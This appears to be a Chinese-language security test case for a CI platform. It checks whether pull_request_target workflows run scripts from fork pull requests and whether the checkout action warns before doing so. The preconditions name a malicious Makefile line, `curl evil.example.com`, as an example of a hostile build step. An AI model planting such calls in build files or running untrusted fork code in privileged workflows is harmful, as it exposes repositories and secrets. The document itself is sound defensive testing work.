用例 ID:   SEC-FORK-01-004
维度标签:   [security]
维度:      安全性
优先级:    P0
溯源意图:  INTENT-SEC-004
母意图:    —
标题:      pull_request_target 下显式 checkout fork PR head 代码后不应自动执行其中脚本

前置条件:
  - 目标仓库 main 分支存在 pull_request_target workflow
  - fork 侧 PR 包含恶意 build 脚本（如 Makefile 中含 `curl evil.example.com`）
  - 存在一个来自 fork 的 PR

操作步骤:
  1. 在 fork 侧 PR 的代码中放置标记脚本（如 Makefile 中 `echo "FORK_MAKEFILE_EXECUTED"`）
  2. 在目标仓库的 pull_request_target workflow 中显式 checkout head.sha 引用 fork 侧代码
  3. 执行 `make build` 或等价命令运行 fork 侧脚本
  4. 在不显式 checkout head.sha 的场景，验证 fork 侧代码不应被自动获取
  5. 观察 checkout action 在 checkout fork PR head 时是否产生安全警告

预期结果:
  - 显式 checkout head.sha 后执行 `make build`，fork 侧 Makefile 中的命令应被执行
    （这是 workflow 作者的有意识风险决策）
  - 不显式 checkout ref 时，不应自动获取 fork 侧代码变更
  - GitCode 的 checkout action 应在 checkout fork PR head 时产生警告或要求显式确认

验证点:
  - [正向] 显式 checkout head.sha + `make build` → fork 侧脚本被执行
  - [负向] 未显式 checkout ref 时，不应自动获取 fork 侧代码变更
  - [负向] checkout action 在 checkout fork PR head 时应产生安全警告或要求 opt-in
  - [负向] pull_request_target workflow 的默认 checkout 行为不应拉取 fork 侧代码

清理:      fixture
